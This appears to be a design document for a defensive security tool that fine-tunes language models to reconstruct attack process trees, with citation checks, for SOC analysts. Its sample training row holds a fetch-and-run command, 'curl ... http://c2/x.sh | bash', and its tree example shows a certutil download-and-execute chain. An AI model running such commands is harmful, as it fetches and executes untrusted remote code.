# NivXRay — LLM Training Schema & Prompt-Response Templates

**Purpose**: Fine-tune NivX Cognis (and ThreatBox reasoning agents) on FULL
process-tree reconstruction — not just classification. Every predicted node
is traceable to decoded evidence or explicitly marked inferred; there is
never a silent hallucination.

## Pipeline (matches user architecture)

```
[Raw Command]
     ↓
[1. Decryption / Decoding Engine]   ← existing NivXRay Smart/Magic/AI decoder
     ↓  (clean script)
[2. LLM Graph Parser]               ← /api/analyze/process-tree
     ↓  (nested-JSON ProcessTree)
[3. Output Visualizer]              ← ProcessTreeView (SVG) + Mini in SocVerdictPanel
```

Endpoint contract:
`POST /api/analyze/process-tree` — `{ raw, decoded }` → validated `ProcessTree`

## Canonical Data Model (`training/schema.py`)

### `ProcessNode`
| Field              | Type                | Notes                                                     |
|--------------------|---------------------|-----------------------------------------------------------|
| `node_id`          | str (10-hex)        | Auto-generated                                            |
| `parent_node_id`   | str \| null         | Populated on edge-list export                             |
| `process`          | str                 | Must literally appear in decoded/raw                      |
| `command_line`     | str \| null         | Full CLI as evidenced                                     |
| `executable_path`  | str \| null         | Signed-binary path when known                             |
| `hashes`           | dict[str, str]      | md5 / sha1 / sha256 when provided by decoded stream       |
| `signer`           | str \| null         | Code-signing subject                                      |
| `pid` / `ppid`     | int \| null         | Optional runtime linkage                                   |
| `user`             | str \| null         | e.g. `SYSTEM`, `attacker`                                 |
| `integrity_level`  | str \| null         | `low`\|`medium`\|`high`\|`system`                          |
| `action`           | str                 | Short human-readable purpose                              |
| `lolbin`           | bool                | true when this exe is a known LOLBin                      |
| `mitre_ids`        | list[str]           | Real ATT&CK IDs (`Txxxx` or `Txxxx.yyy`)                   |
| `tactic`           | str \| null         | ATT&CK tactic name                                        |
| `ts_delta_ms`      | int                 | ms after parent spawn                                     |
| `timestamp`        | ISO str \| null     | Optional absolute timestamp                               |
| `evidence`         | `ProcessEvidence`   | Citation, inferred flag, confidence — **required**        |
| `children`         | list[`ProcessNode`] | Recursive                                                  |

### `ProcessEvidence`
| Field         | Type   | Rule                                                    |
|---------------|--------|---------------------------------------------------------|
| `citation`    | str    | Must be a substring of `decoded` OR `raw`               |
| `layer_index` | int?   | Which decode layer produced this node                   |
| `inferred`    | bool   | `true` iff we didn't observe the process literally      |
| `confidence`  | 0..1   | Must be ≤ 0.7 when `inferred=true`                      |

### `SocRationale`
```
verdict              # one-line SOC verdict
severity             # info|low|medium|high|critical
confidence           # 0..1
iocs                 # dict of urls/ips/domains/hashes/files (all cited)
lolbins              # list of LOLBin exec names
mitre_ids            # ATT&CK IDs
tactics              # ATT&CK tactic names
sigma_opportunities  # short Sigma rule ideas
yara_opportunities   # YARA string ideas
evidence_refs        # cited substrings
analyst_summary      # 3-5 sentence SOC ticket brief
```

### `ProcessTree`
```
tree_id, platform (windows|linux|macos|container),
root: ProcessNode,
rationale: SocRationale,
evidence_source: "decoded" | "raw" | "insufficient",
warnings: [...],
generated_ts
```

## Three Representations

### 1. Nested JSON (canonical)
Used internally. Recursive `children` array. Best for LLM structured-output.

### 2. Flat Edge List
```
{
  "tree_id": "...",
  "nodes": [ {...ProcessNode without children}, ... ],
  "edges": [ {"parent": "<id>", "child": "<id>"}, ... ],
  "rationale": {...}
}
```
Best for graph databases / tabular pipelines.

### 3. ASCII Tree
Human-readable indented view — used for both prompts and analyst rendering.
```
[WINDOWS] tree_id=...  · source=decoded
verdict: Certutil download-and-execute  (high)
MITRE  : T1105, T1218, T1204.002
LOLBins: certutil.exe

└─ cmd.exe  [T1059.003]  (inferred)
   cmd: cmd.exe /c ...
   → Parent shell
   ├─ certutil.exe  [T1105,T1218]
   │  cmd: certutil.exe -urlcache -split -f ...
   │  → LOLBin download
   └─ a.exe  [T1204.002]  (inferred)
      cmd: %TEMP%\a.exe
      → Dropped binary execution
```

## Anti-Hallucination Guarantees

**Layer 1 — Prompt** (`training/system_prompt.py`):
- 7 hard rules explicitly enforce citation-per-node & no invented IOCs.
- Failure mode: return single-node tree with `evidence_source="insufficient"`.

**Layer 2 — Schema** (`training/schema.py`):
- Pydantic types reject unknown fields / malformed nesting.

**Layer 3 — Validator** (`training/validator.py`):
- Every `citation` must appear (case-insensitive) inside `decoded` or `raw`.
- Uncited child nodes are pruned.
- Uncited IOCs are dropped from `rationale.iocs`.
- Warnings appended to `tree.warnings` so operators see what was pruned.

## Prompt-Response Templates

### System Prompt (fixed)
See `training/system_prompt.py` — 60 lines defining role, hard rules, and
strict JSON output shape. Identical for OpenAI and Anthropic fine-tunes.

### User Prompt (fixed shape)
```
RAW_INPUT:
<raw command line or obfuscated payload>

DECODED_OUTPUT:
<deterministic decoder output>

Emit strict JSON per the schema. Cite every node.
```

### Assistant Response (fixed shape)
Serialised `ProcessTree` JSON — nothing else. See sample below.

### Sample Complete Row
```json
{
  "messages": [
    {"role": "system", "content": "<NIVXRAY_PROCESS_TREE_SYSTEM>"},
    {"role": "user",   "content": "RAW_INPUT:\ncurl -fsSL http://c2/x.sh | bash\n\nDECODED_OUTPUT:\ncurl -fsSL http://c2/x.sh | bash\n\nEmit strict JSON per the schema. Cite every node."},
    {"role": "assistant", "content": "{\"platform\":\"linux\",\"root\":{\"process\":\"bash\",\"command_line\":\"bash -c 'curl -fsSL http://c2/x.sh | bash'\",\"evidence\":{\"citation\":\"curl -fsSL http://c2/x.sh | bash\",\"inferred\":false,\"confidence\":0.9},...},\"rationale\":{...}}"}
  ],
  "metadata": {"training_id": "NIVX_LNX_001", "platform": "linux", "category": "bash"}
}
```

## Seed Dataset

**`training/seed_dataset.py`** — **101 archetypes** across:

| Platform  | Count | Categories                                                           |
|-----------|-------|----------------------------------------------------------------------|
| windows   |    70 | powershell, cmd, lolbin, office-macro, jscript, wmi, ransomware, discovery |
| linux     |    27 | bash, curl-pipe, wget-pipe, python, perl, cron, systemd, ssh, cloud-cli    |
| container |     2 | docker, kubectl                                                      |
| macos     |     2 | osascript, launchctl                                                 |

Difficulty: 46 easy · 41 medium · 14 hard.

Every archetype contains:
- Real-world raw command line
- Decoded / de-obfuscated analysis
- Full ProcessTree with citations
- SOC rationale (verdict, MITRE, tactics, IOCs, LOLBins, Sigma & YARA opportunities)
- Analyst summary
- Tags + difficulty

## Export Formats (`training/exporter.py`)

| Format      | Media type              | Row shape                                                        |
|-------------|-------------------------|------------------------------------------------------------------|
| `jsonl`     | application/x-ndjson    | Canonical `TrainingRecord` per line                              |
| `openai`    | application/x-ndjson    | `{messages:[system,user,assistant], metadata:{...}}`             |
| `anthropic` | application/x-ndjson    | `{system, conversations:[user,assistant], metadata:{...}}`       |
| `csv`       | text/csv                | id, platform, category, difficulty, tags, raw, decoded, verdict, severity, mitre_ids, tactics, lolbins, ascii_tree |
| `edge-list` | application/x-ndjson    | `{tree_id, nodes:[...], edges:[...], rationale, raw, decoded}`   |

Endpoint: `GET /api/training/dataset?format=<fmt>&platform=&category=`

## Backend Endpoints

```
POST /api/analyze/process-tree      → predict + validate a tree
GET  /api/training/schema           → return canonical schema + system prompt
GET  /api/training/stats            → dataset totals + breakdown
GET  /api/training/archetypes       → list seed archetype metadata (filterable)
GET  /api/training/dataset          → download dataset in any format
POST /api/training/render           → convert nested-JSON tree → ascii | edge-list | json
```

All endpoints protected by JWT (existing `get_current_user` dep).

## Frontend Components

- `ProcessTreeView.jsx` — SVG tactic-coloured tree with drawer + full SOC rationale
- `ProcessTreeMini.jsx` — compact linear chain preview inside SocVerdictPanel
- Wired into `WorkspacePage.jsx` after AttackGraph card

## Design principles (why this schema is future-proof)

1. **Provider-agnostic**: same canonical `ProcessTree` renders as both OpenAI
   `messages` and Anthropic `conversations` — no schema branching in code.
2. **Composable**: nested-JSON → flat edges → ASCII is bidirectional; you can
   benchmark which format yields best fine-tune reasoning.
3. **Enforceable**: three defence layers guarantee no silent hallucination,
   matching the platform's existing decode anti-hallucination promise.
4. **Extensible**: adding a new archetype = one entry in
   `_ARCHES` (compact builder). No schema change needed.
